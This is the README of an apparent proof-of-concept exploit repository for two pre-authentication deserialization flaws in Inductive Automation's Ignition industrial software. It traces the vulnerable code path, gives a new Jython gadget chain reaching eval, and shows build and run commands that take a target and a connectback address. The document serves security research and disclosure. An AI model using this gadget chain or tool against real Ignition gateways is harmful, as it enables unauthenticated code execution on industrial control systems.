# DoubleTrouble

This repository details the exploitation of deserialization vulnerabilities in Inductive Automation's Ignition software, specifically CVE-2023-39475 and CVE-2023-39476. These critical vulnerabilities enable remote attackers to execute arbitrary code without requiring authentication. The document offers an in-depth look at the vulnerabilities, exploitation methods, and instructions for using the DoubleTrouble PoC exploit.

## Table of Contents
- [Overview](#overview)
- [Affected Versions](#affected-versions)
- [Vulnerability Summary](#vulnerability-summary)
- [Additional Insights](#additional-insights)
- [Detailed Vulnerability Analysis](#detailed-vulnerability-analysis)
- [Exploit Methodology](#exploit-methodology)
- [Exploit Gadget Chain](#exploit-gadget-chain)
- [Building DoubleTrouble](#building-doubletrouble)
- [Running DoubleTrouble](#running-doubletrouble)
- [Usage Examples](#usage-examples)
- [References and Credits](#references-and-credits)

## Overview
1. **ParameterVersionJavaSerializationCodec Deserialization RCE Vulnerability (CVE-2023-39475)**
2. **JavaSerializationCodec Deserialization RCE Vulnerability (CVE-2023-39476)**

These vulnerabilities, critically rated with a CVSS score of 9.8, pose a significant threat to systems using affected Ignition software versions. They allow remote attackers to execute arbitrary code without requiring authentication, potentially leading to complete system compromise, data theft, and unauthorized system control.

DoubleTrouble serves as a proof-of-concept to illustrate the exploitation process of these vulnerabilities, providing insights into their mechanics and the potential risks they pose. The tool targets Ignition versions 8.1.22 to 8.1.24, which are confirmed to be vulnerable. 

Both vulnerabilities are critically rated with a CVSS score of 9.8, indicating their potential for severe impact [(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.0)

## Affected Versions

The vulnerabilities affect the following versions of Inductive Automation's Ignition software:
- 8.1.22
- 8.1.23
- 8.1.24

## Vulnerability Summary

These deserialization vulnerabilities in the `JavaSerializationCodec` and `ParameterVersionJavaSerializationCodec` classes of Inductive Automation's Ignition version `8.1.24` and below allow remote attackers to execute arbitrary code on affected systems without requiring authentication.

The specific flaws exist within each of the implemented decode methods, which lack proper input validation on untrusted data. These vulnerabilities allow attackers to inject malicious code into the targeted system that will execute with NT AUTHORITY/SYSTEM privileges.

Inductive Automation has been made aware of these vulnerabilities and it is recommended that users of Ignition version <= 8.1.24 update to the latest version as soon as possible to protect against potential exploitation. A proof-of-concept exploit with our [RCE gadget](https://github.com/frohoff/ysoserial/blob/47eb0859c3ed0905d2680b75f10ff6f17050a1f0/src/main/java/ysoserial/payloads/Jython2.java) has been developed to demonstrate how these vulnerabilities can be exploited in practice.

## Additional Insights

### Pwn2Own Miami 2023

These vulnerabilities were discovered and exploited in preperation for Pwn2Own Miami 2023, unfortunately the rules changed on January 4th rendering our work useless for the competition. 
Please see: https://web.archive.org/web/20230101043715/https://www.zerodayinitiative.com/Pwn2OwnMiami2023Rules.html

### Network Configuration Requirements

The vulnerabilities require the gateway network to be configured, which is a common configuration: [Gateway Network](https://docs.inductiveautomation.com/display/DOC80/Gateway+Network). 
This was same vector as used in [Pwn2Own Miami 2020](https://www.zerodayinitiative.com/advisories/ZDI-20-687/), so it appears that vendors don't learn.

### SSL Considerations on Gateway

SSL needs to be disabled in the network gateway *unless* HTTPS is enabled on the server, in which case the attacker can set the SSL flag in the exploit to true to have the exploit work over HTTPS.

![non ssl](/pics/non-ssl-requirement.png)

## Detailed Vulnerability Analysis

Starting from the `com.inductiveautomation.metro.impl.protocol.websocket.servlet.DataChannelServlet` code:

```java
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
  InputStream inputStream = req.getInputStream();
  OutputStream outputStream = resp.getOutputStream();

  
  ProtocolHeader header = null;
  try {
    header = ProtocolHeader.decode(inputStream);
  } catch (LocalException e) {
    getLogger().error("onDataReceived", "Could not process protocol header from incoming data channel message", e);
  } 

  
  if (header != null) {
    String connectionId = header.getSenderId();
    startMdc(connectionId);
    Optional<WebSocketConnection> optConnection = getFactory().getIncomingBySystemName(connectionId);
    
    if (optConnection.isEmpty()) {
      if (getLogger().isDebugEnabled()) {
        getLogger().debug("doPost", 
            String.format("Data channel error: connection id '%s' was not found on this server. The web socket may be trying to reconnect", new Object[] { connectionId }), null);
      }
    } else {
      
      if (getLogger().isTraceEnabled())
        getLogger().trace("doPost", String.format("Received data message [%d] from %s at %s", new Object[] {
                Short.valueOf(header.getMessageId()), header
                .getSenderId(), header
                .getSenderURL()
              })); 
      ((WebSocketConnection)optConnection.get()).onDataReceived(header, inputStream, outputStream); // 1
    } 
    clearMdc();
  } 
}
```

We can reach `onDataReceived` of the `WebSocketConnection` class with attacker input:

```java
public void onDataReceived(ProtocolHeader header, InputStream inputStream, OutputStream outputStream) {
  //...
  try {
    try {
      reserveCapacity();
      acquired = true;

      
      TransportMessage msg = TransportMessage.createFrom(new MeterTrackedInputStream(inputStream, this.incomingMeter, true)); // 2
      
      CompletableFuture<Void> routeFuture = null;
      Instant routingStartTime = Instant.now();
      try {
        setSecurityContextInfo();
        Instant start = Instant.now();
        routeFuture = forward(header.getTargetAddress(), msg); // 3
```

We can setup an arb `TransportMessage` and call `forward` with it...

```java
protected CompletableFuture<Void> forward(String targetAddress, TransportMessage msg) { return this.receiveHandler.handle(targetAddress, msg); }
```

The `receiveHandler` will be the `ConnectionWatcher`:

```java
public CompletableFuture<Void> handle(String targetAddress, TransportMessage data) {
  CompletableFuture<Void> ret = new CompletableFuture<Void>();
  ServerId serverId = ServerId.fromString(targetAddress);
  
  try { ServerMessage sm = ServerMessage.createFrom(data); // 4
    ServerId sendingServer = ServerId.fromString((String)sm.getHeaderValues().get("_source_"));
    MDC.MDCCloseable ignored = MDC.putCloseable("gan-remote-gateway-name", sendingServer
        .toDescriptiveString());



    
    try { updateSecurityContext(sm);
      
      if (this.centralManager.isEndOfRoute(serverId)) {
        Exception errResult = null;
        
        if (sm.getIntentName().startsWith("_conn_")) {
          handleConnectionMessage(sm); // 5
```

The code calls `handleConnectionMessage`

```java
protected void handleConnectionMessage(ServerMessage message) throws Exception {
  if (this.conn != null) {
    boolean available; String intentName = message.getIntentName();
    if ("_conn_init".equalsIgnoreCase(intentName)) {
      setRemoteServerAddress(ServerId.fromString(message.getHeaderValue("_source_")));
      ConnectionEvent.ConnectStatus stat = this.conn.getStatus();
      info(String.format("Connection successfully established. Remote server name: %s. Connection status: %s", new Object[] { this.remoteServerAddress, stat }));
    
    }
    else if ("_conn_svr".equalsIgnoreCase(intentName)) { // 6
      setRemoteServerAddress(ServerId.fromString(message.getHeaderValue("_source_")));
      available = "true".equals(message.getHeaderValue("replyrequested"));
      ServerRouteDetails[] routes = (ServerRouteDetails[])message.decodePayload(); // 7
```

We set the `intentName` name to '_conn_svr' to reach [7], `decodePayload`:

```java
public <T> T decodePayload() throws Exception {
  MessageCodec codec = MessageCodecFactory.get().getCodec(getCodecName()); // 8
  return (T)codec.decode(getSourceStream()); //9
}
```

We can set the codec name to two different MessageCodec classes:

1. `JavaSerializationCodec` (_js_)

```java
public class JavaSerializationCodec
  implements MessageCodec
{
  public static final String ID = "_js_";
  protected static final Logger logger = Logger.getLogger("metro.Codecs.JavaSerializationCodec");

  //...
  public Object decode(InputStream inputStream) throws Exception {
    in = null;
    
    try {
      in = createObjectInputStream(inputStream);
      return in.readObject(); // 10
    } finally {
      IOUtils.closeQuietly(in);
    } 
  }
```

2. `ParameterVersionJavaSerializationCodec` (_js_tps_v3)

```java
protected static class ParameterVersionJavaSerializationCodec
  implements MessageCodec
{
  public static final String ID = "_js_tps_v3";
  
  protected static final Logger logger = Logger.getLogger("metro.Codecs.JavaSerializationCodec");


  
  public String getId() { return "_js_tps_v3"; }

  public Object decode(InputStream inputStream) throws Exception {
    in = null;
    
    try {
      in = createObjectInputStream(inputStream);
      return in.readObject(); // 11
    } finally {
      IOUtils.closeQuietly(in);
    } 
  }
```

At [10] we reach the first unprotected pre-auth deserialization vulnerability and at [11] we can reach a second unprotected pre-auth deserialization vulnerability. However to reach the deserialization in `ParameterVersionJavaSerializationCodec` the attacker will need to register the `MessageCodec`. This can be done by reaching the code inside of the `com.inductiveautomation.metro.impl.services.ServiceManagerImpl` class

```java
    protected Object invokeService(ServerId sourceServerAddr, ServiceInvocation invocation, DiagnosticIdentifier id) throws Exception {
        if (this.logger.isDebugEnabled()) {
            this.logger.debug(String.format("Received invocation from '%s' '%s' with data: %s", sourceServerAddr, id.toFriendlyName(), invocation));
        }

        ServiceImplementation target = (ServiceImplementation)this.serviceHandlers.get(invocation.getServiceId());
        if (target == null) {
            throw new UnknownServiceException(invocation.getServiceId());
        } else {
            this.recordServiceInvocation(invocation, sourceServerAddr, id.getDescription());
            VersionAdapter va = CallableEntityUtils.getVersionAdapter(target.getServiceClazz());
            invocation = (ServiceInvocation)va.adaptIncomingInvocation(invocation.getVersion(), invocation);
            SecurityContext sCtx = (SecurityContext)SecurityContextThreadLocal.instance().get();
            int appVersion = Integer.parseInt((String)sCtx.getOrDefault("version", "1"));
            sCtx.put("svc_version", invocation.getVersion());
            this.secMgr.checkMethodAccess(sCtx, target.getImplementation().getClass(), invocation.getMethodName());
            Method m = target.getServiceClazz().getMethod(invocation.getMethodName(), invocation.getArgTypes());

            try {
                Object retVal = m.invoke(target.getImplementation(), invocation.getArguments());
                retVal = va.adaptOutgoingReturn(invocation.getVersion(), invocation, retVal); // 12
```

At [12] the code calls `adaptOutgoingReturn` after invoking a method from the service in the `com.inductiveautomation.metro.api.versioning.AbstractServiceVersionAdapter` class:

```java
   public Object adaptOutgoingReturn(int targetVersion, Object invocationData, Object result) throws Exception {
      return this.adaptOutgoingServiceReturn(targetVersion, (ServiceInvocation)invocationData, result); // 13
   }

```

Then at [13] this will call the `adaptOutgoingServiceReturn` inside of the `com.inductiveautomation.ignition.gateway.tags.distributed.TagProviderService2VersionAdapter` class since we are invoking a method on this service.

```java
public class TagProviderService2VersionAdapter extends AbstractServiceVersionAdapter {
   public static final int CURRENT_VERSION = 6;
   private static final ParameterVersionJavaSerializationCodec V3CODEC = new ParameterVersionJavaSerializationCodec();
   
   //...
   
   public Object adaptOutgoingServiceReturn(int targetVersion, ServiceInvocation invocationData, Object result) throws Exception {
      if (targetVersion < 2 && "getProperties".equalsIgnoreCase(invocationData.getMethodName())) {
         result = TagProviderProps.newBuilder().copy((TagProviderProps)result).editRights(EditRights.noRights()).build();
      } 

      if (targetVersion < 3) {
         MessageCodecFactory.get().registerCodec(V3CODEC); // 14
         result = new CodecAdaptation(V3CODEC.getId(), "_js_", result);
      }

      return result;
   }
```

Finally at [14] the code will register the dangerous `MessageCodec` which is why our attack for the deserialization in `ParameterVersionJavaSerializationCodec` requires two different requests.

## Exploit Methodology

However in order to exploit these vulnerabilities, an attacker would be required to develop a non-public gadget chain to achieve remote code execution. 
We decided to revisit the `jython-ia-2.7.2.1.jar` library because:

1. Reaching arbitrary python code is powerful
2. I like Java and Python :->
3. Ignition seemed heavily dependant on Python, so the library is likley to stick around :->

Looking at the jython gadget in ysoserial, I discovered that the `org.python.core.PyFunction` class is protected with a `readResolve` one liner killing the gadget in ysoserial:

`private Object readResolve() { throw new UnsupportedOperationException(); }`

But I noticed another class, `org.python.core.PyMethod` that implements `java.lang.reflect.InvocationHandler` so we can leverage a similar vector 

```java
public class PyMethod
  extends PyObject
  implements InvocationHandler, Traverseproc {
```

So we can recycle `PriorityQueue` using a proxy to call an arbitrary `InvocationHandler.invoke`:

```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
  if (method.getDeclaringClass() == Object.class)
    return method.invoke(this, args); 
  if (args == null || args.length == 0) {
    return __call__().__tojava__(method.getReturnType());
  }
  return __call__(Py.javas2pys(args)).__tojava__(method.getReturnType());
}`
```

This lead me to some serious dive into the jython code base, but I ended up discovering two gadgets: 

1. JNDI Injection -> JDBC Injection via `com.ziclix.python.sql.connect.Lookup` 
2. RCE via `org.python.core.BuiltinFunctions`

I decided for option 2 because there were no JDBC Drivers and/or ObjectFactories available for easy exploitation of the JNDI/JDBC pivots and I just wanted something cleaner. Lets dive into option 2.

We can reach an arbitrary `__call__` inside of the `org.python.core.BuiltinFunctions` class

```java
   public PyObject __call__(PyObject arg1, PyObject arg2) {
      switch (this.index) {
         case 2:
            return __builtin__.range(arg1, arg2);
         case 3:
         case 4:
         case 5:
         case 7:
         case 8:
         case 11:
         case 14:
         case 16:
         case 23:
         case 24:
         case 25:
         case 28:
         case 32:
         case 34:
         case 36:
         case 37:
         case 38:
         case 39:
         case 40:
         case 41:
         case 42:
         default:
            throw this.info.unexpectedCall(2, false);
         case 6:
            return Py.newInteger(__builtin__.cmp(arg1, arg2));
         case 9:
            return __builtin__.apply(arg1, arg2);
         case 10:
            return Py.newBoolean(__builtin__.isinstance(arg1, arg2));
         case 12:
            return __builtin__.sum(arg1, arg2);
         case 13:
            return __builtin__.coerce(arg1, arg2);
         case 15:
            __builtin__.delattr(arg1, arg2);
            return Py.None;
         case 17:
            return __builtin__.divmod(arg1, arg2);
         case 18:
            return __builtin__.eval(arg1, arg2); // here
         case 19:
            __builtin__.execfile(Py.fileSystemDecode(arg1), arg2);
            return Py.None;
```

I choose case 18, but I had case 19 as a potential fallback vector as well. So the complete gadget chain looks like this:

## Exploit Gadget Chain

```plaintext
java.io.ObjectInputStream.readObject
    java.util.PriorityQueue.readObject
        java.util.PriorityQueue.heapify
            java.util.PriorityQueue.siftDownUsingComparator
                com.sun.proxy.$Proxy4.compare
                    org.python.core.PyMethod.invoke
                        org.python.core.PyMethod.__call__
                            org.python.core.PyMethod.instancemethod___call__
                                org.python.core.PyObject.__call__
                                    org.python.core.PyBuiltinFunctionNarrow.__call__
                                        org.python.core.BuiltinFunctions.__call__
                                            org.python.core.__builtin__.eval
                                                org.python.core.Py.runCode
```

## Building DoubleTrouble

To build the `DoubleTrouble` tool, use the following Maven command:

```bash
mvn clean package -DskipTests
```

This command will compile the project and package it into a JAR file while skipping the test cases.

## Running DoubleTrouble

After building, you can run `DoubleTrouble` using the following Java command:

```bash
java -cp target/dt.jar:libs/metro-8.1.22.jar DoubleTrouble
```

## Usage Examples

### Command Line Help

```bash
java -cp target/dt.jar:libs/metro-8.1.22.jar DoubleTrouble
java DoubleTrouble <target> <connectback:port> [outgoing ip]
```

### Auto detection of the outgoing server

![Attacking the target using the ParameterVersionJavaSerializationCodec vulnerability](/pics/ParameterVersionJavaSerializationCodec.gif)

### Specifying the outgoing directly (for an internet routable attack)

![Attacking the target using the JavaSerializationCodec vulnerability](/pics/JavaSerializationCodec.gif)

## References and Credits

1. **ZDI-23-1046**: [ZDI-23-1046 Advisory](https://www.zerodayinitiative.com/advisories/ZDI-23-1046/)
2. **ZDI-23-1047**: [ZDI-23-1047 Advisory](https://www.zerodayinitiative.com/advisories/ZDI-23-1047/)
3. **Inductive Automation Advisory**: [Technical Advisory](https://support.inductiveautomation.com/hc/en-us/articles/18333051904653--Tech-Advisory-Regarding-the-Security-Advisories-Published-by-the-ZDI-on-8-August-2023)

### Discovery Credits
- Rocco Calvi (@TecR0c) and Steven Seeley (mr_me) of the Incite Team.
